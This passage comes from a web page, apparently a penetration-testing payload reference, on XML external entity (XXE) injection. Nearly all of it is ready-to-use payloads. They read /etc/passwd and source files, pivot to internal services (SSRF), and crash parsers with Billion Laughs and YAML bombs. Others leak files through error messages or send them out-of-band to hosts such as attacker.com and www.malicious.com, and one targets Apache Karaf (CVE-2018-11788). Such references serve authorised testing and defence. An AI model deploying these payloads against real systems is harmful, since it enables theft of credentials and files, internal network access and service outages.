+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="cp">&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM &quot;data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk&quot;&gt;</span><span class="w"> </span>%init;<span class="w"> </span>]&gt;<span class="nt">&lt;foo/&gt;</span>
+</code></pre></div>
+<h3 id="php-wrapper-inside-xxe">PHP Wrapper inside XXE</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="cp">&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;</span><span class="w"> </span>]&gt;
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="nt">&lt;contacts&gt;</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w">  </span><span class="nt">&lt;contact&gt;</span>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w">    </span><span class="nt">&lt;name&gt;</span>Jean<span class="w"> </span><span class="ni">&amp;xxe;</span><span class="w"> </span>Dupont<span class="nt">&lt;/name&gt;</span>
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="w">    </span><span class="nt">&lt;phone&gt;</span>00<span class="w"> </span>11<span class="w"> </span>22<span class="w"> </span>33<span class="w"> </span>44<span class="nt">&lt;/phone&gt;</span>
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="w">    </span><span class="nt">&lt;address&gt;</span>42<span class="w"> </span>rue<span class="w"> </span>du<span class="w"> </span>CTF<span class="nt">&lt;/address&gt;</span>
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="w">    </span><span class="nt">&lt;zipcode&gt;</span>75000<span class="nt">&lt;/zipcode&gt;</span>
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="w">    </span><span class="nt">&lt;city&gt;</span>Paris<span class="nt">&lt;/city&gt;</span>
+<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="w">  </span><span class="nt">&lt;/contact&gt;</span>
+<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="nt">&lt;/contacts&gt;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="cp">&lt;!DOCTYPE foo [</span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="cp">&lt;!ELEMENT foo ANY &gt;</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="cp">&lt;!ENTITY % xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=http://10.0.0.3&quot; &gt;</span>
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>]&gt;
+<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
+</code></pre></div>
+<h3 id="xinclude-attacks">XInclude attacks</h3>
+<p>When you can't modify the <strong>DOCTYPE</strong> element use the <strong>XInclude</strong> to target </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="nt">&lt;foo</span><span class="w"> </span><span class="na">xmlns:xi=</span><span class="s">&quot;http://www.w3.org/2001/XInclude&quot;</span><span class="nt">&gt;</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="nt">&lt;xi:include</span><span class="w"> </span><span class="na">parse=</span><span class="s">&quot;text&quot;</span><span class="w"> </span><span class="na">href=</span><span class="s">&quot;file:///etc/passwd&quot;</span><span class="nt">/&gt;&lt;/foo&gt;</span>
+</code></pre></div>
+<h2 id="exploiting-xxe-to-perform-ssrf-attacks">Exploiting XXE to perform SSRF attacks</h2>
+<p>XXE can be combined with the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery">SSRF vulnerability</a> to target another service on the network.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="cp">&lt;!DOCTYPE foo [</span>
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="cp">&lt;!ELEMENT foo ANY &gt;</span>
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="cp">&lt;!ENTITY % xxe SYSTEM &quot;http://internal.service/secret_pass.txt&quot; &gt;</span>
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>]&gt;
+<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
+</code></pre></div>
+<h2 id="exploiting-xxe-to-perform-a-deny-of-service">Exploiting XXE to perform a deny of service</h2>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> : These attacks might kill the service or the server, do not use them on the production.</p>
+<h3 id="billion-laugh-attack">Billion Laugh Attack</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="cp">&lt;!DOCTYPE data [</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="cp">&lt;!ENTITY a0 &quot;dos&quot; &gt;</span>
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="cp">&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;</span>
+<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="cp">&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;</span>
+<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="cp">&lt;!ENTITY a3 &quot;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&quot;&gt;</span>
+<a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="cp">&lt;!ENTITY a4 &quot;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&quot;&gt;</span>
+<a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>]&gt;
+<a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a><span class="nt">&lt;data&gt;</span><span class="ni">&amp;a4;</span><span class="nt">&lt;/data&gt;</span>
+</code></pre></div>
+<h3 id="yaml-attack">Yaml attack</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>a:<span class="w"> </span><span class="err">&amp;</span>a<span class="w"> </span>[&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;]
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>b:<span class="w"> </span><span class="err">&amp;</span>b<span class="w"> </span>[*a,*a,*a,*a,*a,*a,*a,*a,*a]
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>c:<span class="w"> </span><span class="err">&amp;</span>c<span class="w"> </span>[*b,*b,*b,*b,*b,*b,*b,*b,*b]
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>d:<span class="w"> </span><span class="err">&amp;</span>d<span class="w"> </span>[*c,*c,*c,*c,*c,*c,*c,*c,*c]
+<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>e:<span class="w"> </span><span class="err">&amp;</span>e<span class="w"> </span>[*d,*d,*d,*d,*d,*d,*d,*d,*d]
+<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>f:<span class="w"> </span><span class="err">&amp;</span>f<span class="w"> </span>[*e,*e,*e,*e,*e,*e,*e,*e,*e]
+<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>g:<span class="w"> </span><span class="err">&amp;</span>g<span class="w"> </span>[*f,*f,*f,*f,*f,*f,*f,*f,*f]
+<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>h:<span class="w"> </span><span class="err">&amp;</span>h<span class="w"> </span>[*g,*g,*g,*g,*g,*g,*g,*g,*g]
+<a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>i:<span class="w"> </span><span class="err">&amp;</span>i<span class="w"> </span>[*h,*h,*h,*h,*h,*h,*h,*h,*h]
+</code></pre></div>
+<h3 id="parameters-laugh-attack">Parameters Laugh attack</h3>
+<p>A variant of the Billion Laughs attack, using delayed interpretation of parameter entities, by Sebastian Pipping.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="cp">&lt;!DOCTYPE r [</span>
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="cp">  &lt;!ENTITY % pe_1 &quot;&lt;!----&gt;</span>&quot;&gt;
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="w">  </span><span class="cp">&lt;!ENTITY % pe_2 &quot;&amp;#37;pe_1;&lt;!----&gt;</span><span class="ni">&amp;#37;</span>pe_1;&quot;&gt;
+<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="w">  </span><span class="cp">&lt;!ENTITY % pe_3 &quot;&amp;#37;pe_2;&lt;!----&gt;</span><span class="ni">&amp;#37;</span>pe_2;&quot;&gt;
+<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="w">  </span><span class="cp">&lt;!ENTITY % pe_4 &quot;&amp;#37;pe_3;&lt;!----&gt;</span><span class="ni">&amp;#37;</span>pe_3;&quot;&gt;
+<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="w">  </span>%pe_4;
+<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>]&gt;
+<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a><span class="nt">&lt;r/&gt;</span>
+</code></pre></div>
+<h2 id="exploiting-error-based-xxe">Exploiting Error Based XXE</h2>
+<h3 id="error-based-using-local-dtd-file">Error Based - Using Local DTD File</h3>
+<p>Short list of dtd files already stored on Linux systems; list them with <code>locate .dtd</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>/usr/share/xml/fontconfig/fonts.dtd
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>/usr/share/xml/svg/svg10.dtd
+<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>/usr/share/xml/svg/svg11.dtd
+<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>/usr/share/yelp/dtd/docbookx.dtd
+</code></pre></div>
+<p>The file <code>/usr/share/xml/fontconfig/fonts.dtd</code> has an injectable entity <code>%constant</code> at line 148: <code>&lt;!ENTITY % constant 'int|double|string|matrix|bool|charset|langset|const'&gt;</code></p>
+<p>The final payload becomes: 
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="cp">&lt;!DOCTYPE message [</span>
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="cp">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/fontconfig/fonts.dtd&quot;&gt;</span>
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="w">    </span><span class="cp">&lt;!ENTITY % constant &#39;aaa)&gt;</span>
+<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="w">            </span><span class="cp">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>
+<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="w">            </span><span class="cp">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///patt/&amp;#x25;file;&amp;#x27;&gt;</span>&quot;&gt;
+<a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="w">            </span><span class="ni">&amp;#x25;</span>eval;
+<a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="w">            </span><span class="ni">&amp;#x25;</span>error;
+<a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="w">            </span><span class="cp">&lt;!ELEMENT aa (bb&#39;&gt;</span>
+<a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a><span class="w">    </span>%local_dtd;
+<a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>]&gt;
+<a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a><span class="nt">&lt;message&gt;</span>Text<span class="nt">&lt;/message&gt;</span>
+</code></pre></div></p>
+<h3 id="error-based-using-remote-dtd">Error Based - Using Remote DTD</h3>
+<p><strong>Payload to trigger the XXE</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; ?&gt;</span>
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="cp">&lt;!DOCTYPE message [</span>
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="cp">    &lt;!ENTITY % ext SYSTEM &quot;http://attacker.com/ext.dtd&quot;&gt;</span>
+<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="w">    </span>%ext;
+<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>]&gt;
+<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a><span class="nt">&lt;message&gt;&lt;/message&gt;</span>
+</code></pre></div>
+<p><strong>Content of ext.dtd</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="cp">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="cp">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;file:///nonexistent/%file;&#39;&gt;</span>&quot;&gt;
+<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>%eval;
+<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>%error;
+</code></pre></div>
+<p>Let's break down the payload:</p>
+<ol>
+<li><code>&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</code>
+  This line defines an external entity named file that references the content of the file /etc/passwd (a Unix-like system file containing user account details).</li>
+<li><code>&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;</code>
+  This line defines an entity eval that holds another entity definition. This other entity (error) is meant to reference a nonexistent file and append the content of the file entity (the <code>/etc/passwd</code> content) to the end of the file path. The <code>&amp;#x25;</code> is a URL-encoded '<code>%</code>' used to reference an entity inside an entity definition.</li>
+<li><code>%eval;</code>
+  This line uses the eval entity, which causes the entity error to be defined.</li>
+<li><code>%error;</code>
+  Finally, this line uses the error entity, which attempts to access a nonexistent file with a path that includes the content of <code>/etc/passwd</code>. Since the file doesn't exist, an error will be thrown. If the application reports back the error to the user and includes the file path in the error message, then the content of <code>/etc/passwd</code> would be disclosed as part of the error message, revealing sensitive information.</li>
+</ol>
+<h2 id="exploiting-blind-xxe-to-exfiltrate-data-out-of-band">Exploiting blind XXE to exfiltrate data out-of-band</h2>
+<p>Sometimes you won't have a result outputted in the page but you can still extract the data with an out of band attack.</p>
+<h3 id="basic-blind-xxe">Basic Blind XXE</h3>
+<p>The easiest way to test for a blind XXE is to try to load a remote resource such as a Burp Collaborator.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; ?&gt;</span>
+<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="cp">&lt;!ENTITY % ext SYSTEM &quot;http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x&quot;&gt;</span><span class="w"> </span>%ext;
+<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>]&gt;
+<a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="nt">&lt;r&gt;&lt;/r&gt;</span>
+</code></pre></div>
+<p>Send the content of <code>/etc/passwd</code> to "www.malicious.com", you may receive only the first line.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span>
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="cp">&lt;!DOCTYPE foo [</span>
+<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="cp">&lt;!ELEMENT foo ANY &gt;</span>
+<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="cp">&lt;!ENTITY % xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span>
+<a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="cp">&lt;!ENTITY callhome SYSTEM &quot;www.malicious.com/?%xxe;&quot;&gt;</span>
+<a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>]
+<a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a>&gt;
+<a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a><span class="nt">&lt;foo&gt;</span><span class="ni">&amp;callhome;</span><span class="nt">&lt;/foo&gt;</span>
+</code></pre></div>
+<h3 id="xxe-oob-attack-yunusov-2013">XXE OOB Attack (Yunusov, 2013)</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
+<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="cp">&lt;!DOCTYPE data SYSTEM &quot;http://publicServer.com/parameterEntity_oob.dtd&quot;&gt;</span>
+<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="nt">&lt;data&gt;</span><span class="ni">&amp;send;</span><span class="nt">&lt;/data&gt;</span>
+<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>
+<a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>File<span class="w"> </span>stored<span class="w"> </span>on<span class="w"> </span>http://publicServer.com/parameterEntity_oob.dtd
+<a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a><span class="cp">&lt;!ENTITY % file SYSTEM &quot;file:///sys/power/image_size&quot;&gt;</span>
+<a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a><span class="cp">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http://publicServer.com/?%file;&#39;&gt;</span>&quot;&gt;
+<a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a>%all;
+</code></pre></div>
+<h3 id="xxe-oob-with-dtd-and-php-filter">XXE OOB with DTD and PHP filter</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; ?&gt;</span>
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="cp">&lt;!DOCTYPE r [</span>
+<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="cp">&lt;!ELEMENT r ANY &gt;</span>
+<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="cp">&lt;!ENTITY % sp SYSTEM &quot;http://127.0.0.1/dtd.xml&quot;&gt;</span>
+<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>%sp;
+<a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>%param1;
+<a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a>]&gt;
+<a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a><span class="nt">&lt;r&gt;</span><span class="ni">&amp;exfil;</span><span class="nt">&lt;/r&gt;</span>
+<a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a>
+<a id="__codelineno-27-10" name="__codelineno-27-10" href="#__codelineno-27-10"></a>File<span class="w"> </span>stored<span class="w"> </span>on<span class="w"> </span>http://127.0.0.1/dtd.xml
+<a id="__codelineno-27-11" name="__codelineno-27-11" href="#__codelineno-27-11"></a><span class="cp">&lt;!ENTITY % data SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;</span>
+<a id="__codelineno-27-12" name="__codelineno-27-12" href="#__codelineno-27-12"></a><span class="cp">&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#39;http://127.0.0.1/dtd.xml?%data;&#39;&gt;</span>&quot;&gt;
+</code></pre></div>
+<h3 id="xxe-oob-with-apache-karaf">XXE OOB with Apache Karaf</h3>
+<p>CVE-2018-11788 affecting versions:</p>
+<ul>
+<li>Apache Karaf &lt;= 4.2.1</li>
+<li>Apache Karaf &lt;= 4.1.6</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="cp">&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com&quot;&gt;</span><span class="w"> </span>%dtd;]
+<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="nt">&lt;features</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;my-features&quot;</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://karaf.apache.org/xmlns/features/v1.3.0&quot;</span><span class="w"> </span><span class="na">xmlns:xsi=</span><span class="s">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>
+<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="w">        </span><span class="na">xsi:schemaLocation=</span><span class="s">&quot;http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0&quot;</span><span class="nt">&gt;</span>
+<a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="w">    </span><span class="nt">&lt;feature</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;deployer&quot;</span><span class="w"> </span><span class="na">version=</span><span class="s">&quot;2.0&quot;</span><span class="w"> </span><span class="na">install=</span><span class="s">&quot;auto&quot;</span><span class="nt">&gt;</span>
+<a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a><span class="w">    </span><span class="nt">&lt;/feature&gt;</span>
+<a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a><span class="nt">&lt;/features&gt;</span>
+</code></pre></div>
+<p>Send the XML file to the <code>deploy</code> folder.</p>
+<p>Ref. <a href="https://github.com/brianwrf/CVE-2018-11788">brianwrf/CVE-2018-11788</a></p>
+<h2 id="xxe-with-local-dtd">XXE with local DTD</h2>
+<p>In some case, outgoing connections are not possible from the web application. DNS names might even not resolve externally with a payload like this:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="cp">&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#39;http://h3l9e5soi0090naz81tmq5ztaaaaaa.burpcollaborator.net&#39;&gt;</span>]&gt;
+<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="nt">&lt;root&gt;</span><span class="ni">&amp;test;</span><span class="nt">&lt;/root&gt;</span>
+</code></pre></div></p>
+<p>If error based exfiltration is possible, you can still rely on a local DTD to do concatenation tricks. Payload to confirm that error message include filename.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="cp">&lt;!DOCTYPE root [</span>
+<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="cp">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///abcxyz/&quot;&gt;</span>
+<a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>
+<a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="w">    </span>%local_dtd;
+<a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>]&gt;
+<a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a><span class="nt">&lt;root&gt;&lt;/root&gt;</span>
+</code></pre></div>
+<p>Assuming payloads such as the previous return a verbose error. You can start pointing to local DTD. With an found DTD, you can submit payload such as the following payload. The content of the file will be place in the error message.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="cp">&lt;!DOCTYPE root [</span>
+<a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="cp">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span>
+<a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>
+<a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="w">    </span><span class="cp">&lt;!ENTITY % ISOamsa &#39;</span>
+<a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a><span class="cp">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///REPLACE_WITH_FILENAME_TO_READ&quot;&gt;</span>
+<a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a><span class="w">        </span><span class="cp">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;</span>&quot;&gt;
+<a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a><span class="w">        </span><span class="ni">&amp;#x25;</span>eval;
+<a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a><span class="w">        </span><span class="ni">&amp;#x25;</span>error;
+<a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a><span class="w">        </span>&#39;&gt;
+<a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a>
+<a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a><span class="w">    </span>%local_dtd;
+<a id="__codelineno-31-12" name="__codelineno-31-12" href="#__codelineno-31-12"></a>]&gt;
